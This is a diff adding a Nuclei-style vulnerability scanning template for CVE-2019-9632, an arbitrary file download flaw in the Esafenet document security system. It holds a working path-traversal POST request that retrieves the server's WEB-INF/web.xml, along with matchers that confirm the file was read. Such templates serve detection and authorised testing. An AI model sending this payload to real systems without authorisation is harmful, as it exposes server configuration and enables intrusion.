@@ -1,0 +1,28 @@
+id: poc-yaml-yisaitong-esafenet-clientajax-anyfile-download
+info:
+  name: 亿赛通电子文档安全管理系统 ClientAjax 任意文件下载漏洞 (CVE-2019-9632)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2019-9632
+http:
+  - raw:
+      - |
+        POST /CDGServer3/ClientAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=downclientpak&InstallationPack=../WEB-INF/web.xml&forward=index.jsp
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<param-name>"
+          - "web-app"
+      - type: word
+        part: header
+        words:
+          - "xml"
